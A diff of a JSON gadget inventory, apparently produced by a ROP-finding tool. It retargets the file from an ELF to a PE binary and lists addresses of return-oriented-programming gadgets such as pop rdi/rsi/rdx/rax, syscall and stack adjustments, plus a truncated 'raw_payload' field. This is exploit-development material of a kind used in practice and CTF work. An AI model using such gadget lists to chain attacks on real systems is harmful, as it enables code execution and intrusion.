@@ -1,141 +1,999 @@
 {
     "architecture": "x86_64",
-    "file_type": "ELF",
+    "file_type": "PE",
     "gadgets": [
         {
-            "address": "0x0000000000401070",
+            "address": "0x0000000140001000",
             "category": "x86_64",
             "gadget": "ret",
             "instructions": "ret"
         },
         {
-            "address": "0x00000000004010a0",
+            "address": "0x00000001400010ed",
+            "category": "x86_64",
+            "gadget": "pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret",
+            "instructions": "pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret"
+        },
+        {
+            "address": "0x00000001400010ef",
+            "category": "x86_64",
+            "gadget": "pop r13 ; pop r14 ; pop r15 ; ret",
+            "instructions": "pop r13 ; pop r14 ; pop r15 ; ret"
+        },
+        {
+            "address": "0x00000001400010f1",
+            "category": "x86_64",
+            "gadget": "pop r14 ; pop r15 ; ret",
+            "instructions": "pop r14 ; pop r15 ; ret"
+        },
+        {
+            "address": "0x00000001400010f3",
+            "category": "x86_64",
+            "gadget": "pop r15 ; ret",
+            "instructions": "pop r15 ; ret"
+        },
+        {
+            "address": "0x00000001400010f5",
             "category": "x86_64",
             "gadget": "ret",
             "instructions": "ret"
         },
         {
-            "address": "0x00000000004010e0",
+            "address": "0x00000001400013f8",
+            "category": "x86_64",
+            "gadget": "add rsp, 0x28 ; ret",
+            "instructions": "add rsp, 0x28 ; ret"
+        },
+        {
+            "address": "0x00000001400013fc",
             "category": "x86_64",
             "gadget": "ret",
             "instructions": "ret"
         },
         {
-            "address": "0x0000000000401106",
+            "address": "0x0000000140001418",
             "category": "x86_64",
-            "gadget": "mov byte ptr [rip + 0x2f13], 1 ; pop rbp ; ret",
-            "instructions": "mov byte ptr [rip + 0x2f13], 1 ; pop rbp ; ret"
+            "gadget": "add rsp, 0x28 ; ret",
+            "instructions": "add rsp, 0x28 ; ret"
         },
         {
-            "address": "0x000000000040110d",
-            "category": "x86_64",
-            "gadget": "pop rbp ; ret",
-            "instructions": "pop rbp ; ret"
-        },
-        {
-            "address": "0x000000000040110e",
+            "address": "0x000000014000141c",
             "category": "x86_64",
             "gadget": "ret",
             "instructions": "ret"
         },
         {
-            "address": "0x0000000000401110",
+            "address": "0x0000000140001440",
             "category": "x86_64",
             "gadget": "ret",
             "instructions": "ret"
         },
         {
-            "address": "0x0000000000401126",
+            "address": "0x0000000140001450",
             "category": "x86_64",
             "gadget": "push rbp ; mov rbp, rsp ; pop rdi ; ret",
             "instructions": "push rbp ; mov rbp, rsp ; pop rdi ; ret"
         },
         {
-            "address": "0x0000000000401127",
+            "address": "0x0000000140001451",
             "category": "x86_64",
             "gadget": "mov rbp, rsp ; pop rdi ; ret",
             "instructions": "mov rbp, rsp ; pop rdi ; ret"
         },
         {
-            "address": "0x000000000040112a",
+            "address": "0x0000000140001454",
             "category": "x86_64",
             "gadget": "pop rdi ; ret",
             "instructions": "pop rdi ; ret"
         },
         {
-            "address": "0x000000000040112b",
+            "address": "0x0000000140001455",
             "category": "x86_64",
             "gadget": "ret",
             "instructions": "ret"
         },
         {
-            "address": "0x000000000040112c",
+            "address": "0x0000000140001456",
             "category": "x86_64",
             "gadget": "pop rsi ; ret",
             "instructions": "pop rsi ; ret"
         },
         {
-            "address": "0x000000000040112d",
+            "address": "0x0000000140001457",
             "category": "x86_64",
             "gadget": "ret",
             "instructions": "ret"
         },
         {
-            "address": "0x000000000040112e",
+            "address": "0x0000000140001458",
             "category": "x86_64",
             "gadget": "pop rdx ; ret",
             "instructions": "pop rdx ; ret"
         },
         {
-            "address": "0x000000000040112f",
+            "address": "0x0000000140001459",
             "category": "x86_64",
             "gadget": "ret",
             "instructions": "ret"
         },
         {
-            "address": "0x0000000000401130",
+            "address": "0x000000014000145a",
             "category": "x86_64",
             "gadget": "pop rax ; ret",
             "instructions": "pop rax ; ret"
         },
         {
-            "address": "0x0000000000401131",
+            "address": "0x000000014000145b",
             "category": "x86_64",
             "gadget": "ret",
             "instructions": "ret"
         },
         {
-            "address": "0x0000000000401132",
+            "address": "0x000000014000145c",
             "category": "x86_64",
             "gadget": "syscall",
             "instructions": "syscall"
         },
         {
-            "address": "0x0000000000401135",
-            "category": "x86_64",
-            "gadget": "pop rbp ; ret",
-            "instructions": "pop rbp ; ret"
-        },
-        {
-            "address": "0x0000000000401136",
+            "address": "0x000000014000145e",
             "category": "x86_64",
             "gadget": "ret",
             "instructions": "ret"
         },
         {
-            "address": "0x0000000000401159",
-            "category": "x86_64",
-            "gadget": "mov eax, 0 ; pop rbp ; ret",
-            "instructions": "mov eax, 0 ; pop rbp ; ret"
-        },
-        {
-            "address": "0x000000000040115e",
+            "address": "0x0000000140001460",
             "category": "x86_64",
             "gadget": "pop rbp ; ret",
             "instructions": "pop rbp ; ret"
         },
         {
-            "address": "0x000000000040115f",
+            "address": "0x0000000140001461",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x0000000140001486",
+            "category": "x86_64",
+            "gadget": "add rsp, 0x60 ; pop rbp ; ret",
+            "instructions": "add rsp, 0x60 ; pop rbp ; ret"
+        },
+        {
+            "address": "0x000000014000148a",
+            "category": "x86_64",
+            "gadget": "pop rbp ; ret",
+            "instructions": "pop rbp ; ret"
+        },
+        {
+            "address": "0x000000014000148b",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x00000001400014ea",
+            "category": "x86_64",
+            "gadget": "mov eax, 0 ; add rsp, 0x20 ; pop rbp ; ret",
+            "instructions": "mov eax, 0 ; add rsp, 0x20 ; pop rbp ; ret"
+        },
+        {
+            "address": "0x00000001400014ef",
+            "category": "x86_64",
+            "gadget": "add rsp, 0x20 ; pop rbp ; ret",
+            "instructions": "add rsp, 0x20 ; pop rbp ; ret"
+        },
+        {
+            "address": "0x00000001400014f3",
+            "category": "x86_64",
+            "gadget": "pop rbp ; ret",
+            "instructions": "pop rbp ; ret"
+        },
+        {
+            "address": "0x00000001400014f4",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x000000014000153d",
+            "category": "x86_64",
+            "gadget": "add rsp, 0x28 ; ret",
+            "instructions": "add rsp, 0x28 ; ret"
+        },
+        {
+            "address": "0x0000000140001541",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x00000001400015da",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x00000001400015f0",
+            "category": "x86_64",
+            "gadget": "xor eax, eax ; ret",
+            "instructions": "xor eax, eax ; ret"
+        },
+        {
+            "address": "0x00000001400015f2",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x0000000140001609",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x0000000140001642",
+            "category": "x86_64",
+            "gadget": "add rsp, 0x28 ; pop rbx ; pop rsi ; ret",
+            "instructions": "add rsp, 0x28 ; pop rbx ; pop rsi ; ret"
+        },
+        {
+            "address": "0x0000000140001646",
+            "category": "x86_64",
+            "gadget": "pop rbx ; pop rsi ; ret",
+            "instructions": "pop rbx ; pop rsi ; ret"
+        },
+        {
+            "address": "0x0000000140001647",
+            "category": "x86_64",
+            "gadget": "pop rsi ; ret",
+            "instructions": "pop rsi ; ret"
+        },
+        {
+            "address": "0x0000000140001648",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x0000000140001683",
+            "category": "x86_64",
+            "gadget": "add rsp, 0x28 ; pop rbx ; pop rsi ; ret",
+            "instructions": "add rsp, 0x28 ; pop rbx ; pop rsi ; ret"
+        },
+        {
+            "address": "0x0000000140001687",
+            "category": "x86_64",
+            "gadget": "pop rbx ; pop rsi ; ret",
+            "instructions": "pop rbx ; pop rsi ; ret"
+        },
+        {
+            "address": "0x0000000140001688",
+            "category": "x86_64",
+            "gadget": "pop rsi ; ret",
+            "instructions": "pop rsi ; ret"
+        },
+        {
+            "address": "0x0000000140001689",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x00000001400016a0",
+            "category": "x86_64",
+            "gadget": "xor eax, eax ; ret",
+            "instructions": "xor eax, eax ; ret"
+        },
+        {
+            "address": "0x00000001400016a2",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x0000000140001742",
+            "category": "x86_64",
+            "gadget": "movups xmm8, xmmword ptr [rsp + 0x60] ; add rsp, 0x78 ; pop rbx ; pop rsi ; ret",
+            "instructions": "movups xmm8, xmmword ptr [rsp + 0x60] ; add rsp, 0x78 ; pop rbx ; pop rsi ; ret"
+        },
+        {
+            "address": "0x0000000140001748",
+            "category": "x86_64",
+            "gadget": "add rsp, 0x78 ; pop rbx ; pop rsi ; ret",
+            "instructions": "add rsp, 0x78 ; pop rbx ; pop rsi ; ret"
+        },
+        {
+            "address": "0x000000014000174c",
+            "category": "x86_64",
+            "gadget": "pop rbx ; pop rsi ; ret",
+            "instructions": "pop rbx ; pop rsi ; ret"
+        },
+        {
+            "address": "0x000000014000174d",
+            "category": "x86_64",
+            "gadget": "pop rsi ; ret",
+            "instructions": "pop rsi ; ret"
+        },
+        {
+            "address": "0x000000014000174e",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x00000001400018e5",
+            "category": "x86_64",
+            "gadget": "add rsp, 0x50 ; pop rbx ; pop rsi ; pop rdi ; ret",
+            "instructions": "add rsp, 0x50 ; pop rbx ; pop rsi ; pop rdi ; ret"
+        },
+        {
+            "address": "0x00000001400018e9",
+            "category": "x86_64",
+            "gadget": "pop rbx ; pop rsi ; pop rdi ; ret",
+            "instructions": "pop rbx ; pop rsi ; pop rdi ; ret"
+        },
+        {
+            "address": "0x00000001400018ea",
+            "category": "x86_64",
+            "gadget": "pop rsi ; pop rdi ; ret",
+            "instructions": "pop rsi ; pop rdi ; ret"
+        },
+        {
+            "address": "0x00000001400018eb",
+            "category": "x86_64",
+            "gadget": "pop rdi ; ret",
+            "instructions": "pop rdi ; ret"
+        },
+        {
+            "address": "0x00000001400018ec",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x00000001400019a8",
+            "category": "x86_64",
+            "gadget": "pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret",
+            "instructions": "pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret"
+        },
+        {
+            "address": "0x00000001400019aa",
+            "category": "x86_64",
+            "gadget": "pop r14 ; pop r15 ; pop rbp ; ret",
+            "instructions": "pop r14 ; pop r15 ; pop rbp ; ret"
+        },
+        {
+            "address": "0x00000001400019ac",
+            "category": "x86_64",
+            "gadget": "pop r15 ; pop rbp ; ret",
+            "instructions": "pop r15 ; pop rbp ; ret"
+        },
+        {
+            "address": "0x00000001400019ae",
+            "category": "x86_64",
+            "gadget": "pop rbp ; ret",
+            "instructions": "pop rbp ; ret"
+        },
+        {
+            "address": "0x00000001400019af",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x0000000140001d49",
+            "category": "x86_64",
+            "gadget": "add rsp, 0x58 ; ret",
+            "instructions": "add rsp, 0x58 ; ret"
+        },
+        {
+            "address": "0x0000000140001d4d",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x0000000140001e04",
+            "category": "x86_64",
+            "gadget": "mov eax, 0xffffffff ; add rsp, 0x20 ; pop rbx ; ret",
+            "instructions": "mov eax, 0xffffffff ; add rsp, 0x20 ; pop rbx ; ret"
+        },
+        {
+            "address": "0x0000000140001e09",
+            "category": "x86_64",
+            "gadget": "add rsp, 0x20 ; pop rbx ; ret",
+            "instructions": "add rsp, 0x20 ; pop rbx ; ret"
+        },
+        {
+            "address": "0x0000000140001e0d",
+            "category": "x86_64",
+            "gadget": "pop rbx ; ret",
+            "instructions": "pop rbx ; ret"
+        },
+        {
+            "address": "0x0000000140001e0e",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x0000000140001e20",
+            "category": "x86_64",
+            "gadget": "xor eax, eax ; add rsp, 0x20 ; pop rbx ; ret",
+            "instructions": "xor eax, eax ; add rsp, 0x20 ; pop rbx ; ret"
+        },
+        {
+            "address": "0x0000000140001e22",
+            "category": "x86_64",
+            "gadget": "add rsp, 0x20 ; pop rbx ; ret",
+            "instructions": "add rsp, 0x20 ; pop rbx ; ret"
+        },
+        {
+            "address": "0x0000000140001e26",
+            "category": "x86_64",
+            "gadget": "pop rbx ; ret",
+            "instructions": "pop rbx ; ret"
+        },
+        {
+            "address": "0x0000000140001e27",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x0000000140001fa1",
+            "category": "x86_64",
+            "gadget": "xor eax, eax ; add rsp, 0x38 ; ret",
+            "instructions": "xor eax, eax ; add rsp, 0x38 ; ret"
+        },
+        {
+            "address": "0x0000000140001fa3",
+            "category": "x86_64",
+            "gadget": "add rsp, 0x38 ; ret",
+            "instructions": "add rsp, 0x38 ; ret"
+        },
+        {
+            "address": "0x0000000140001fa7",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x000000014000202e",
+            "category": "x86_64",
+            "gadget": "xor eax, eax ; add rsp, 0x28 ; ret",
+            "instructions": "xor eax, eax ; add rsp, 0x28 ; ret"
+        },
+        {
+            "address": "0x0000000140002030",
+            "category": "x86_64",
+            "gadget": "add rsp, 0x28 ; ret",
+            "instructions": "add rsp, 0x28 ; ret"
+        },
+        {
+            "address": "0x0000000140002034",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x0000000140002090",
+            "category": "x86_64",
+            "gadget": "xor eax, eax ; add rsp, 0x28 ; ret",
+            "instructions": "xor eax, eax ; add rsp, 0x28 ; ret"
+        },
+        {
+            "address": "0x0000000140002092",
+            "category": "x86_64",
+            "gadget": "add rsp, 0x28 ; ret",
+            "instructions": "add rsp, 0x28 ; ret"
+        },
+        {
+            "address": "0x0000000140002096",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x00000001400020d1",
+            "category": "x86_64",
+            "gadget": "mov dword ptr [rip + 0x500d], 1 ; mov eax, 1 ; add rsp, 0x38 ; ret",
+            "instructions": "mov dword ptr [rip + 0x500d], 1 ; mov eax, 1 ; add rsp, 0x38 ; ret"
+        },
+        {
+            "address": "0x00000001400020db",
+            "category": "x86_64",
+            "gadget": "mov eax, 1 ; add rsp, 0x38 ; ret",
+            "instructions": "mov eax, 1 ; add rsp, 0x38 ; ret"
+        },
+        {
+            "address": "0x00000001400020e0",
+            "category": "x86_64",
+            "gadget": "add rsp, 0x38 ; ret",
+            "instructions": "add rsp, 0x38 ; ret"
+        },
+        {
+            "address": "0x00000001400020e4",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x000000014000217d",
+            "category": "x86_64",
+            "gadget": "mov eax, 1 ; add rsp, 0x38 ; ret",
+            "instructions": "mov eax, 1 ; add rsp, 0x38 ; ret"
+        },
+        {
+            "address": "0x0000000140002182",
+            "category": "x86_64",
+            "gadget": "add rsp, 0x38 ; ret",
+            "instructions": "add rsp, 0x38 ; ret"
+        },
+        {
+            "address": "0x0000000140002186",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x00000001400021c0",
+            "category": "x86_64",
+            "gadget": "fninit ; ret",
+            "instructions": "fninit ; ret"
+        },
+        {
+            "address": "0x00000001400021c2",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x00000001400021e8",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x00000001400021f0",
+            "category": "x86_64",
+            "gadget": "xor eax, eax ; cmp word ptr [rcx + 0x18], 0x20b ; sete al ; ret",
+            "instructions": "xor eax, eax ; cmp word ptr [rcx + 0x18], 0x20b ; sete al ; ret"
+        },
+        {
+            "address": "0x00000001400021f2",
+            "category": "x86_64",
+            "gadget": "cmp word ptr [rcx + 0x18], 0x20b ; sete al ; ret",
+            "instructions": "cmp word ptr [rcx + 0x18], 0x20b ; sete al ; ret"
+        },
+        {
+            "address": "0x00000001400021f8",
+            "category": "x86_64",
+            "gadget": "sete al ; ret",
+            "instructions": "sete al ; ret"
+        },
+        {
+            "address": "0x00000001400021fb",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x000000014000224d",
+            "category": "x86_64",
+            "gadget": "xor eax, eax ; ret",
+            "instructions": "xor eax, eax ; ret"
+        },
+        {
+            "address": "0x000000014000224f",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x000000014000227d",
+            "category": "x86_64",
+            "gadget": "pop rbx ; pop rsi ; pop rdi ; pop rbp ; ret",
+            "instructions": "pop rbx ; pop rsi ; pop rdi ; pop rbp ; ret"
+        },
+        {
+            "address": "0x000000014000227e",
+            "category": "x86_64",
+            "gadget": "pop rsi ; pop rdi ; pop rbp ; ret",
+            "instructions": "pop rsi ; pop rdi ; pop rbp ; ret"
+        },
+        {
+            "address": "0x000000014000227f",
+            "category": "x86_64",
+            "gadget": "pop rdi ; pop rbp ; ret",
+            "instructions": "pop rdi ; pop rbp ; ret"
+        },
+        {
+            "address": "0x0000000140002280",
+            "category": "x86_64",
+            "gadget": "pop rbp ; ret",
+            "instructions": "pop rbp ; ret"
+        },
+        {
+            "address": "0x0000000140002281",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x0000000140002310",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x000000014000236d",
+            "category": "x86_64",
+            "gadget": "xor eax, eax ; ret",
+            "instructions": "xor eax, eax ; ret"
+        },
+        {
+            "address": "0x000000014000236f",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x000000014000238f",
+            "category": "x86_64",
+            "gadget": "mov eax, ecx ; ret",
+            "instructions": "mov eax, ecx ; ret"
+        },
+        {
+            "address": "0x0000000140002391",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x00000001400023a0",
+            "category": "x86_64",
+            "gadget": "movzx ecx, word ptr [rax + 6] ; mov eax, ecx ; ret",
+            "instructions": "movzx ecx, word ptr [rax + 6] ; mov eax, ecx ; ret"
+        },
+        {
+            "address": "0x00000001400023a4",
+            "category": "x86_64",
+            "gadget": "mov eax, ecx ; ret",
+            "instructions": "mov eax, ecx ; ret"
+        },
+        {
+            "address": "0x00000001400023a6",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x00000001400023d0",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x0000000140002428",
+            "category": "x86_64",
+            "gadget": "xor eax, eax ; ret",
+            "instructions": "xor eax, eax ; ret"
+        },
+        {
+            "address": "0x000000014000242a",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x000000014000244f",
+            "category": "x86_64",
+            "gadget": "mov rax, rdx ; ret",
+            "instructions": "mov rax, rdx ; ret"
+        },
+        {
+            "address": "0x0000000140002452",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x0000000140002458",
+            "category": "x86_64",
+            "gadget": "cmp word ptr [rcx + 0x18], 0x20b ; cmove rdx, rax ; mov rax, rdx ; ret",
+            "instructions": "cmp word ptr [rcx + 0x18], 0x20b ; cmove rdx, rax ; mov rax, rdx ; ret"
+        },
+        {
+            "address": "0x000000014000245e",
+            "category": "x86_64",
+            "gadget": "cmove rdx, rax ; mov rax, rdx ; ret",
+            "instructions": "cmove rdx, rax ; mov rax, rdx ; ret"
+        },
+        {
+            "address": "0x0000000140002462",
+            "category": "x86_64",
+            "gadget": "mov rax, rdx ; ret",
+            "instructions": "mov rax, rdx ; ret"
+        },
+        {
+            "address": "0x0000000140002465",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x0000000140002490",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x00000001400024ed",
+            "category": "x86_64",
+            "gadget": "xor eax, eax ; ret",
+            "instructions": "xor eax, eax ; ret"
+        },
+        {
+            "address": "0x00000001400024ef",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x00000001400024f0",
+            "category": "x86_64",
+            "gadget": "mov eax, dword ptr [rax + 0x24] ; not eax ; shr eax, 0x1f ; ret",
+            "instructions": "mov eax, dword ptr [rax + 0x24] ; not eax ; shr eax, 0x1f ; ret"
+        },
+        {
+            "address": "0x00000001400024f3",
+            "category": "x86_64",
+            "gadget": "not eax ; shr eax, 0x1f ; ret",
+            "instructions": "not eax ; shr eax, 0x1f ; ret"
+        },
+        {
+            "address": "0x00000001400024f5",
+            "category": "x86_64",
+            "gadget": "shr eax, 0x1f ; ret",
+            "instructions": "shr eax, 0x1f ; ret"
+        },
+        {
+            "address": "0x00000001400024f8",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x0000000140002521",
+            "category": "x86_64",
+            "gadget": "mov rax, r8 ; ret",
+            "instructions": "mov rax, r8 ; ret"
+        },
+        {
+            "address": "0x0000000140002524",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x000000014000257e",
+            "category": "x86_64",
+            "gadget": "xor r8d, r8d ; mov rax, r8 ; ret",
+            "instructions": "xor r8d, r8d ; mov rax, r8 ; ret"
+        },
+        {
+            "address": "0x0000000140002581",
+            "category": "x86_64",
+            "gadget": "mov rax, r8 ; ret",
+            "instructions": "mov rax, r8 ; ret"
+        },
+        {
+            "address": "0x0000000140002584",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x00000001400025ab",
+            "category": "x86_64",
+            "gadget": "mov r8d, dword ptr [rax + 0xc] ; add r8, r11 ; mov rax, r8 ; ret",
+            "instructions": "mov r8d, dword ptr [rax + 0xc] ; add r8, r11 ; mov rax, r8 ; ret"
+        },
+        {
+            "address": "0x00000001400025af",
+            "category": "x86_64",
+            "gadget": "add r8, r11 ; mov rax, r8 ; ret",
+            "instructions": "add r8, r11 ; mov rax, r8 ; ret"
+        },
+        {
+            "address": "0x00000001400025b2",
+            "category": "x86_64",
+            "gadget": "mov rax, r8 ; ret",
+            "instructions": "mov rax, r8 ; ret"
+        },
+        {
+            "address": "0x00000001400025b5",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x00000001400025e8",
+            "category": "x86_64",
+            "gadget": "sub rcx, rax ; or qword ptr [rcx], 0 ; pop rax ; pop rcx ; ret",
+            "instructions": "sub rcx, rax ; or qword ptr [rcx], 0 ; pop rax ; pop rcx ; ret"
+        },
+        {
+            "address": "0x00000001400025eb",
+            "category": "x86_64",
+            "gadget": "or qword ptr [rcx], 0 ; pop rax ; pop rcx ; ret",
+            "instructions": "or qword ptr [rcx], 0 ; pop rax ; pop rcx ; ret"
+        },
+        {
+            "address": "0x00000001400025ef",
+            "category": "x86_64",
+            "gadget": "pop rax ; pop rcx ; ret",
+            "instructions": "pop rax ; pop rcx ; ret"
+        },
+        {
+            "address": "0x00000001400025f0",
+            "category": "x86_64",
+            "gadget": "pop rcx ; ret",
+            "instructions": "pop rcx ; ret"
+        },
+        {
+            "address": "0x00000001400025f1",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x000000014000262b",
+            "category": "x86_64",
+            "gadget": "add rsp, 0x30 ; pop rbx ; pop rsi ; pop rdi ; ret",
+            "instructions": "add rsp, 0x30 ; pop rbx ; pop rsi ; pop rdi ; ret"
+        },
+        {
+            "address": "0x000000014000262f",
+            "category": "x86_64",
+            "gadget": "pop rbx ; pop rsi ; pop rdi ; ret",
+            "instructions": "pop rbx ; pop rsi ; pop rdi ; ret"
+        },
+        {
+            "address": "0x0000000140002630",
+            "category": "x86_64",
+            "gadget": "pop rsi ; pop rdi ; ret",
+            "instructions": "pop rsi ; pop rdi ; ret"
+        },
+        {
+            "address": "0x0000000140002631",
+            "category": "x86_64",
+            "gadget": "pop rdi ; ret",
+            "instructions": "pop rdi ; ret"
+        },
+        {
+            "address": "0x0000000140002632",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x000000014000268b",
+            "category": "x86_64",
+            "gadget": "add rsp, 0x40 ; pop rbx ; pop rsi ; pop rdi ; ret",
+            "instructions": "add rsp, 0x40 ; pop rbx ; pop rsi ; pop rdi ; ret"
+        },
+        {
+            "address": "0x000000014000268f",
+            "category": "x86_64",
+            "gadget": "pop rbx ; pop rsi ; pop rdi ; ret",
+            "instructions": "pop rbx ; pop rsi ; pop rdi ; ret"
+        },
+        {
+            "address": "0x0000000140002690",
+            "category": "x86_64",
+            "gadget": "pop rsi ; pop rdi ; ret",
+            "instructions": "pop rsi ; pop rdi ; ret"
+        },
+        {
+            "address": "0x0000000140002691",
+            "category": "x86_64",
+            "gadget": "pop rdi ; ret",
+            "instructions": "pop rdi ; ret"
+        },
+        {
+            "address": "0x0000000140002692",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x00000001400026dc",
+            "category": "x86_64",
+            "gadget": "add rsp, 0x40 ; pop rbx ; pop rsi ; pop rdi ; ret",
+            "instructions": "add rsp, 0x40 ; pop rbx ; pop rsi ; pop rdi ; ret"
+        },
+        {
+            "address": "0x00000001400026e0",
+            "category": "x86_64",
+            "gadget": "pop rbx ; pop rsi ; pop rdi ; ret",
+            "instructions": "pop rbx ; pop rsi ; pop rdi ; ret"
+        },
+        {
+            "address": "0x00000001400026e1",
+            "category": "x86_64",
+            "gadget": "pop rsi ; pop rdi ; ret",
+            "instructions": "pop rsi ; pop rdi ; ret"
+        },
+        {
+            "address": "0x00000001400026e2",
+            "category": "x86_64",
+            "gadget": "pop rdi ; ret",
+            "instructions": "pop rdi ; ret"
+        },
+        {
+            "address": "0x00000001400026e3",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x00000001400026f0",
+            "category": "x86_64",
+            "gadget": "lea rax, [rip + 0x969] ; ret",
+            "instructions": "lea rax, [rip + 0x969] ; ret"
+        },
+        {
+            "address": "0x00000001400026f7",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x0000000140002700",
+            "category": "x86_64",
+            "gadget": "mov rax, qword ptr [rip + 0x1d49] ; mov rax, qword ptr [rax] ; ret",
+            "instructions": "mov rax, qword ptr [rip + 0x1d49] ; mov rax, qword ptr [rax] ; ret"
+        },
+        {
+            "address": "0x0000000140002707",
+            "category": "x86_64",
+            "gadget": "mov rax, qword ptr [rax] ; ret",
+            "instructions": "mov rax, qword ptr [rax] ; ret"
+        },
+        {
+            "address": "0x000000014000270a",
+            "category": "x86_64",
+            "gadget": "ret",
+            "instructions": "ret"
+        },
+        {
+            "address": "0x000000014000279a",
+            "category": "x86_64",
+            "gadget": "pop rbx ; pop rsi ; pop rdi ; pop rbp ; ret",
+            "instructions": "pop rbx ; pop rsi ; pop rdi ; pop rbp ; ret"
+        },
+        {
+            "address": "0x000000014000279b",
+            "category": "x86_64",
+            "gadget": "pop rsi ; pop rdi ; pop rbp ; ret",
+            "instructions": "pop rsi ; pop rdi ; pop rbp ; ret"
+        },
+        {
+            "address": "0x000000014000279c",
+            "category": "x86_64",
+            "gadget": "pop rdi ; pop rbp ; ret",
+            "instructions": "pop rdi ; pop rbp ; ret"
+        },
+        {
+            "address": "0x000000014000279d",
+            "category": "x86_64",
+            "gadget": "pop rbp ; ret",
+            "instructions": "pop rbp ; ret"
+        },
+        {
+            "address": "0x000000014000279e",
             "category": "x86_64",
             "gadget": "ret",
             "instructions": "ret"
@@ -148,26 +1006,26 @@
         "RELRO": "None"
     },
     "raw_payload": {
